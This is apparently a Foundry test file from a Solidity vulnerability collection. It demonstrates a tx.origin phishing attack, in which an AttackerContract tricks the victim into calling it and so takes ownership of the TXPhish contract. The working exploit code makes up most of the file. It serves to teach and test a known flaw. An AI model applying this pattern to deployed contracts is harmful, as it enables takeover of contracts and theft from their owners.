// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.11;

import "forge-std/Test.sol";
import "../../src/Vulns/TXPhish.sol";

contract TXPhishTest is Test {
    TXPhish public txphish;
    AttackerContract attack;
    address attacker = vm.addr(1);
    address victim = vm.addr(2);

    function setUp() public {
        vm.prank(victim);
        txphish = new TXPhish();
        vm.prank(attacker);
        attack = new AttackerContract(txphish,attacker);
        
    }
    function testTXPhish() public {
        console.log("Original Owner of contract:",txphish.owner());
        console.log("Address of Victim:",victim);
        console.log("Address of Attacker:",attacker);
        vm.prank(victim);
        attack.Attack();
        console.log("tx origin address", tx.origin);
        console.log("msg.sender address", msg.sender);
        console.log("Updated Owner of contract:",txphish.owner());

    }
}

contract AttackerContract{
   TXPhish txphish;
   address public owner;
    constructor(TXPhish _txphish, address _attackerAddress) public {
        txphish = TXPhish(_txphish);
        owner = _attackerAddress;
    }

    function Attack() public {   
        txphish.changeOwner(owner);
    }
    }

